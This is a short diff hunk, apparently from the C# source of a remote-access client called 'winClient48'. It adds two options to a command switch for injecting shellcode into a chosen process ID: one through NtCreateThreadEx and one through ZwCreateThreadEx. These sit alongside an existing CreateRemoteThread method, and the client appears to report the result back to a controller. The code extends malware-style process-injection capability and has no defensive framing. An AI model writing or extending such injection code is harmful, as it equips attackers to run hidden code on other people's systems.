@@ -2606,6 +2606,12 @@ namespace winClient48
                             case 2:
                                 ret = loader.fnCreateRemoteThreadSC(nProcId, abShellcode);
                                 break;
+                            case 3:
+                                ret = loader.fnNtCreateThreadExSC(nProcId, abShellcode);
+                                break;
+                            case 4:
+                                ret = loader.fnZwCreateThreadExSC(nProcId, abShellcode);
+                                break;
                         }
 
                         v.fnSendCommand(new string[]
